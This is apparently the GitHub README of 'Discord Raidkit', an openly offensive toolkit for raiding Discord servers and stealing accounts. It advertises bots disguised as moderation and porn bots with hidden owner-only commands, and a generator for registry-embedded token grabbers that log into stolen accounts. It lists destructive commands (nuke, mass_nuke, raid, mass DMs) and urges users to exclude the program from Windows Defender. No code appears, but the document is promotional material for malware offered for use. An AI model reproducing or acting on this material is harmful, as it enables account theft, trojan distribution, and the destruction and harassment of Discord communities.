# Discord Raidkit

⚠ Windows Defender now reports this program as malware - this is a false positive and can be ![excluded](https://support.microsoft.com/en-us/windows/add-an-exclusion-to-windows-security-811816c0-4dfd-af4a-47e4-c301afe13b26#:~:text=Go%20to%20Start%20%3E%20Settings%20%3E%20Update,%2C%20file%20types%2C%20or%20process.)! ⚠

![Discord Raidkit v2.3.4 image](https://user-images.githubusercontent.com/98130822/222992322-ececffd1-ae6d-4d1e-bbc5-a4d6dead6f48.png)

## Contents

- ![Introduction](#Introduction)
- ![Installation](#Installation)
- ![Commands](#Commands)
- ![Repo](#Repo)

---

### Introduction

#### What is Discord Raidkit?

Discord Raidkit is a free and open-source compilation of tools designed for raiding Discord servers and hacking accounts. It focuses on social engineering and includes non-malicious commands to assist with that.

#### Why choose Discord Raidkit?

Discord Raidkit stands out from similar programs because it is free, open-source, and has professionally written code that runs faster than competitors. It is kept up to date and evolves with Discord, using new features such as slash commands.

#### Tools included in Discord Raidkit

Discord Raidkit includes:

- **Anubis**: A moderation bot with genuine server management commands and hidden malicious commands accessible only by the bot owner.

- **Qetesh**: A fully functional porn bot with over 10,000 images and hidden malicious commands accessible only by the bot owner. Images are stored as CDN links in a generated database to drastically improve command-to-render speed.

- **Osiris**: A user authentication token handler that can generate token grabbers to embed within Windows registries, father information about a token, and log into an account with just one selenium script. **To use Osiris, you must include [this browser folder](https://drive.proton.me/urls/7898MKJM2W#LIrqn3KDFmsi) - put it in the same directory as `main.py`!**

---

### Installation

To install Discord Raidkit:

- Download the latest version from the [releases page](https://github.com/the-cult-of-integral/discord-raidkit/releases/latest).

- Run the `install_requirements` script for your operating system.

- Start the program by running `main.py`.

- Ensure that you have Python 3.10.0+ installed — be sure to check "Add to PATH" during installation!

---

### Hidden Commands Summary

|Command|Aliases|Parameters|Brief Description|
|-|-|-|-|
| nick_all | nick, nickall | *nickname* | nickname ever user in a server to *nickname* |
| msg_all | msg, msgall | *message* | send *message* as a DM to every user in a server  |
| spam | --- | *message* | send *message* to every text channel in a server, repeatedly |
| cpurge | --- | --- | delete every channel in a server |
| cflood | --- | *amount*, *name* | create *amount* number of text channels named *name* in a server|
| raid | --- | *role name*, *nickname*, *amount*, *name*, *message* | create and give every user in a server a role named *role name*, nickname every user in a server to *nickname*, delete every channel in a server, create *amount* number of text channels named *name* in a server, and then send *message* to every text channel in a server, repeatedly.
| admin | --- | *member*, *role name* | grant *member* in a server an all-permissions role named *role name*|
| nuke | --- | --- | ban all members from a server, delete every channel in a server, delete every role in a server, delete every emoji in a server, delete every sticker from a server, revoke every invite from a server, then edit a server's name, description, icons, community setting, notifications, verification level, content filter, premium bar and preferred locale |
| mass_nuke | massnuke, nuke_all, nukeall | --- | perform the nuke command on every server the bot is in, one by one |
| leave | --- | --- | leave a server |
| mass_leave | massleave, leave_all, leaveall | --- | leave every server |

---

### Repo

#### Known Issues

As of late, Discord has changed its API yet again. Unfortunately, this has broken how Discord Raidkit creates servers during Osiris' guild command. I am looking into a way to get it working again, but Discord non-existent documentation is not providing any help. Finally, I am aware that Osiris' account information string looks a bit wonky - this is an easy fix. I have seen the issues regarding the bots not loading properly, but I am unable to reproduce these issues on my environment.

#### Repository Milestones

- 10 stars. ✔
- 50 stars. ✔
- 100 stars. ✔
- 250 stars. ✔
- 500 stars. ❌
- 1000 stars. ❌

---

<p align="left">
  <strong>Views</strong> (as of 24/09/2022)<br><br>
  <img src="https://profile-counter.glitch.me/discord-raidkit/count.svg" />
</p>
